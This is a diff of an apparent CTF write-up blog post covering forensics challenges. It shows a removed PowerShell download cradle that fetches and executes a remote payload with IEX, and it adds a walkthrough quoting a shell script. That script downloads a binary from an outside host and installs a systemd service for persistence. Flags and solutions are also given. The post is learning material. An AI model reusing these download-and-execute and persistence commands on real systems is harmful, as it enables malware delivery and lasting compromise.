@@ -13,8 +13,8 @@ This is my first CTF that I have entered though I continue to complete rooms on 
 I've come to understand during this short experience - there's nothing quite like a live CTF. I hope to continue doing CTFs in future, at least, as much as time allows.
 
 (Will be adding more over time).
-- **Posts Added:** trapped source, persistence, plaintext tleasure, alien cradle
-- **Posts to follow:** getting started, initialise connection, questionnaire, critical flight, debut, timed transmission, and extraterrestrial persistence
+- **Posts Added:** trapped source, persistence, plaintext tleasure, alien cradle, extraterrestrial persistence
+- **Posts to follow:** getting started, initialise connection, questionnaire, critical flight, debut, and timed transmission
 
 
 ## Warmup
@@ -121,7 +121,7 @@ Knowing that a lot of text exists within this file, I consider the following com
 ``` bash
 $ strings cradle.ps1
 
-# if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
+# [top portion redacted for warnings]...'{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
 ```
 
 The flag is hiding within the post, separated in such a manner that the usual 'trick' of "HTB{" won't suffice here, so it was a good choice to check the contents with *strings*  first.
@@ -134,5 +134,63 @@ HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}
 
 ## Extraterrestrial Persistence (forensics)
 
+This challenge was provided as a downloadable zip file, which upon extraction reveals a shell script file. I confirm this as usual:
+
+``` bash
+$ file persistence.sh
+
+# persistence.sh: ASCII text, with very long lines (396), with CRLF line terminators
+```
+
+Although the file provided is not executable, being a shell script, I opted to view the file contents first:
+
+``` bash
+$ cat persistence.sh
+
+# n=`whoami`
+# h=`hostname`
+# path='/usr/local/bin/service'
+# if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi
+
+# curl https://files.pypi-install.com/packeges/service -o $path
+
+# chmod +x $path
+
+# echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service
+```
+
+Interesting, not only do we learn a bit of shell script commands, we get an idea of the persistence mechanism the aliens have created (lore information for the CTF, but also knowledge in general). 
+
+The Base64 string seems promising, so I focus my attention there instead.
+There are many sites to decode base64 online, but knowing how to achieve the same result from terminal is ideal for learning. 
+
+The output is sent to the terminal via echo and then piped into the base64 utility with the -d tack for the decode option:
+
+``` bash
+echo "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==" | base64 -d
+```
+
+
+We are then presented with the following decoded output, with our hiding in the Description portion:
+``` text
+[Unit]
+Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
+After=network.target network-online.target
+
+[Service]
+Type=oneshot
+RemainAfterExit=yes
+
+ExecStart=/usr/local/bin/service
+ExecStop=/usr/local/bin/service
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Flag:
+``` text
+HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
+```
 
 
